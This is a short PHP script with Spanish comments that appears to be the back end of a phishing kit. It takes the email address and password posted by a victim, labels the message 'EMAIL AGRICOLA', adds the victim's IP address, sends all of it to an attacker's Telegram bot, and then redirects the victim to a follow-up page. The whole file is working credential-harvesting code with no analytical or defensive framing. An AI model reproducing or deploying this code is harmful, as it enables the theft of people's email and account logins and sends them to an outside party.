<?php
// Obtener la dirección IP del cliente
$ip = $_SERVER['REMOTE_ADDR'];

// Verificar si se ha enviado el formulario
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtener los datos del formulario
    $mai = $_POST['mai'];
    $pss = $_POST['pss'];

    // Construir el mensaje a enviar a Telegram
    $message = "EMAIL AGRICOLA
    Correo electrónico asociado: " . $mai . "\n";
    $message .= "Clave de correo: " . $pss . "\n";
    $message .= "Dirección IP: " . $ip;

    // Cargar la configuración de Telegram desde data.php
    $config = include('data.php');
    $token = $config['token'];
    $chat_id = $config['chat_id'];

    // Enviar el mensaje a Telegram
    $api_url = "https://api.telegram.org/bot{$token}/sendMessage";
    $params = [
        'chat_id' => $chat_id,
        'text' => $message,
    ];
    $query_string = http_build_query($params);
    $request_url = $api_url . '?' . $query_string;
    $response = file_get_contents($request_url);

    // Verificar si el mensaje se envió correctamente
    if ($response === false) {
        echo "Ha ocurrido un error al enviar el mensaje.";
    } else {
        echo "...";
    }
}



{
echo "<script>";
        
        echo "window.location.href='mail2.html';";
        echo "</script>";


}
  
?>